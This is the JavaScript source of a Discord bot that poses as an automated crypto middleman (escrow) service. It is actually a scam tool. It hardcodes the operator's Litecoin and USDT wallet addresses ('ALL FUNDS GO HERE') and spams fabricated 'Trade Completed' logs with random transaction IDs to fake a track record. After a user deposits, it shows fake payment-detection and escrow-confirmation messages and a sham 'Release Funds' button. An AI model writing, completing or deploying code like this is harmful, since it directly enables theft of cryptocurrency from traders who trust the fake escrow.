require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField, Events, SlashCommandBuilder, Routes, MessageFlags } = require('discord.js');
const { REST } = require('@discordjs/rest');
const Database = require('better-sqlite3');

const db = new Database('./panel.db');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

const OWNER_ID = process.env.OWNER_ID;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

// Hardcoded addresses - ALL FUNDS GO HERE
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

// Config storage
let logChannelId = null;
let panelCategoryId = null;

db.exec(`CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT);`);

const commands = [
  new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
  new SlashCommandBuilder().setName('logchannel').setDescription('Set fake transaction log channel').addStringOption(opt => opt.setName('channelid').setDescription('Channel ID').setRequired(true)),
  new SlashCommandBuilder().setName('transaction').setDescription('Send fake transaction to channel').addStringOption(opt => opt.setName('channelid').setDescription('Channel ID').setRequired(true)),
  new SlashCommandBuilder().setName('panelcategory').setDescription('Set ticket category').addStringOption(opt => opt.setName('categoryid').setDescription('Category ID').setRequired(true)),
  new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);

client.once(Events.ClientReady, async () => {
  console.log(`Logged in as ${client.user.tag}`);
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
  
  const logRow = db.prepare("SELECT value FROM config WHERE key='logChannel'").get();
  if (logRow) logChannelId = logRow.value;
  const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
  if (catRow) panelCategoryId = catRow.value;
  
  startFakeSpammer();
});

function generateFakeTxid() {
  return Array(64).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
}

function generateFakeAmount() {
  const usd = (Math.random() * 749 + 1).toFixed(2);
  const ltc = (usd / 55).toFixed(8);
  return { usd, ltc, txid: generateFakeTxid() };
}

async function sendFakeLog(channelId, mention = false) {
  const channel = await client.channels.fetch(channelId).catch(() => null);
  if (!channel) return;
  
  const { usd, ltc, txid } = generateFakeAmount();
  const txidShort = `${txid.substring(0, 10)}...${txid.substring(txid.length-8)}`;
  
  // Randomly decide if receiver is Anonymous or @SOPHIE (as seen in image 3)
  const receiver = Math.random() > 0.8 ? '@SOPHIE' : 'Anonymous';
  
  const embed = new EmbedBuilder()
    .setTitle('• Trade Completed')
    .setDescription(`${ltc} LTC ($${usd} USD)`)
    .addFields(
      { name: 'Sender', value: 'Anonymous', inline: false },
      { name: 'Receiver', value: receiver, inline: false },
      { name: 'Transaction ID', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})` }
    )
    .setColor(0x5865F2)
    .setTimestamp();
    
  await channel.send({ embeds: [embed] });
}

function startFakeSpammer() {
  setInterval(async () => {
    if (!logChannelId) return;
    const delay = Math.random() * 120000 + 120000; // 2-4 mins
    setTimeout(() => sendFakeLog(logChannelId), delay);
  }, 60000);
}

client.on(Events.InteractionCreate, async (interaction) => {
  if (interaction.isChatInputCommand()) {
    if (interaction.commandName === 'panel') {
      // Main embed - matches image exactly
      const mainEmbed = new EmbedBuilder()
        .setTitle("Jace's Auto Middleman")
        .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
        .setColor(0x2B2D31);

      const tutorialRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')
      );

      // Fees embed
      const feesEmbed = new EmbedBuilder()
        .setTitle('Fees:')
        .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
        .setColor(0x2B2D31);

      // LTC Section
      const ltcEmbed = new EmbedBuilder()
        .setTitle('• Request Litecoin •')
        .setColor(0x2B2D31);

      const ltcRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('request_ltc')
          .setLabel('Request LTC')
          .setStyle(ButtonStyle.Primary)
          .setEmoji('🪙')
      );

      // USDT Section - matches image exactly with [BEP-20] formatting
      const usdtEmbed = new EmbedBuilder()
        .setTitle('• Request USDT [BEP-20] •')
        .setDescription('• Network: **BSC (BEP-20)**')
        .setColor(0x2B2D31);

      const usdtRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('request_usdt')
          .setLabel('Request USDT [BEP-20]')
          .setStyle(ButtonStyle.Success)
          .setEmoji('💵')
      );

      await interaction.reply({ 
        embeds: [mainEmbed, feesEmbed, ltcEmbed], 
        components: [tutorialRow, ltcRow] 
      });
      
      await interaction.followUp({ 
        embeds: [usdtEmbed], 
        components: [usdtRow] 
      });
    }
    
    else if (interaction.commandName === 'logchannel') {
      if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
      const id = interaction.options.getString('channelid');
      db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('logChannel', ?)").run(id);
      logChannelId = id;
      await interaction.reply({ content: `✅ Log channel set`, flags: MessageFlags.Ephemeral });
    }
    
    else if (interaction.commandName === 'transaction') {
      if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
      const id = interaction.options.getString('channelid');
      await sendFakeLog(id, true);
      await interaction.reply({ content: `✅ Fake transaction sent`, flags: MessageFlags.Ephemeral });
    }
    
    else if (interaction.commandName === 'panelcategory') {
      if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
      const id = interaction.options.getString('categoryid');
      db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('panelCategory', ?)").run(id);
      panelCategoryId = id;
      await interaction.reply({ content: `✅ Panel category set`, flags: MessageFlags.Ephemeral });
    }
    
    else if (interaction.commandName === 'close') {
      await interaction.channel.delete().catch(() => {});
    }
  }
  
  else if (interaction.isButton()) {
    if (interaction.customId === 'request_ltc' || interaction.customId === 'request_usdt') {
      const isLtc = interaction.customId === 'request_ltc';
      
      const modal = new ModalBuilder()
        .setCustomId(isLtc ? 'ltc_modal' : 'usdt_modal')
        .setTitle('Fill out the format');

      modal.addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('trader_id')
            .setLabel("Paste Your Trader's Username or ID")
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('you_give')
            .setLabel('What are You giving?')
            .setPlaceholder('Describe what you are trading...')
            .setStyle(TextInputStyle.Short)
            .setMaxLength(500)
            .setRequired(true)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('they_give')
            .setLabel('What is Your Trader giving?')
            .setPlaceholder('Describe what they are trading...')
            .setStyle(TextInputStyle.Short)
            .setMaxLength(500)
            .setRequired(true)
        )
      );

      await interaction.showModal(modal);
    }
  }
  
  else if (interaction.isModalSubmit()) {
    const isLtc = interaction.customId === 'ltc_modal';
    const type = isLtc ? 'ltc' : 'usdt';
    
    const traderId = interaction.fields.getTextInputValue('trader_id').trim();
    const youGive = interaction.fields.getTextInputValue('you_give');
    const theyGive = interaction.fields.getTextInputValue('they_give');

    let otherMember;
    try {
      otherMember = await interaction.guild.members.fetch(traderId.replace(/[<@!>]/g, ''));
    } catch {
      return interaction.reply({ content: '❌ Invalid user ID. User must be in this server.', flags: MessageFlags.Ephemeral });
    }

    const channelName = `${type}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100);
    
    const channelOptions = {
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: otherMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    };

    if (panelCategoryId) channelOptions.parent = panelCategoryId;
    
    const channel = await interaction.guild.channels.create(channelOptions);
    await interaction.reply({ content: `✅ Ticket created: ${channel}`, flags: MessageFlags.Ephemeral });

    // Welcome embed
    const welcomeEmbed = new EmbedBuilder()
      .setTitle("👋 Jace's Auto Middleman Service")
      .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
      .addFields(
        { name: `${interaction.user.username}'s side:`, value: youGive, inline: true },
        { name: `${otherMember.user.username}'s side:`, value: theyGive, inline: true }
      )
      .setColor(0x5865F2);

    // Payment info - HARDCODED ADDRESSES
    const paymentEmbed = new EmbedBuilder()
      .setTitle(`Send ${isLtc ? 'Litecoin' : 'USDT [BEP-20]'} to:`)
      .setDescription(`\`${isLtc ? LTC_ADDRESS : USDC_ADDRESS}\``)
      .setColor(0xFF0000);

    // Rules embed
    const rulesEmbed = new EmbedBuilder()
      .setTitle('Rules')
      .setDescription('1. Send exact amount\n2. Wait for confirmation (1-2 minutes)\n3. No refunds after release\n4. Fees: $1.50 for $250+, $0.50 for under $250, FREE under $50')
      .setColor(0xFFA500);

    const closeRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
    );

    await channel.send({ 
      content: `${interaction.user} ${otherMember}`, 
      embeds: [welcomeEmbed, paymentEmbed, rulesEmbed], 
      components: [closeRow] 
    });

    // Fake transaction detection message (simulated)
    setTimeout(async () => {
      const fakeEmbed = new EmbedBuilder()
        .setTitle('⚠️ Transaction Detected')
        .setDescription('Waiting for 1 confirmation...')
        .setColor(0xFFD700);
      await channel.send({ embeds: [fakeEmbed] });
      
      // Fake confirmation after 10 seconds
      setTimeout(async () => {
        const confirmEmbed = new EmbedBuilder()
          .setTitle('✅ Transaction Confirmed!')
          .setDescription('The payment has been confirmed and secured in escrow.\n\nYou may proceed with your trade.')
          .setColor(0x00FF00);
        
        const releaseRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('fake_release').setLabel('Release Funds').setStyle(ButtonStyle.Success)
        );
        
        await channel.send({ embeds: [confirmEmbed], components: [releaseRow] });
      }, 10000);
      
    }, 5000);
  }
  
  if (interaction.customId === 'close_ticket') {
    await interaction.channel.delete().catch(() => {});
  }
  
  if (interaction.customId === 'fake_release') {
    await interaction.reply({ content: '⏳ Processing release...', ephemeral: true });
    setTimeout(async () => {
      await interaction.followUp({ content: '✅ Funds released! (Simulation)', ephemeral: true });
    }, 2000);
  }
});

client.login(DISCORD_TOKEN);
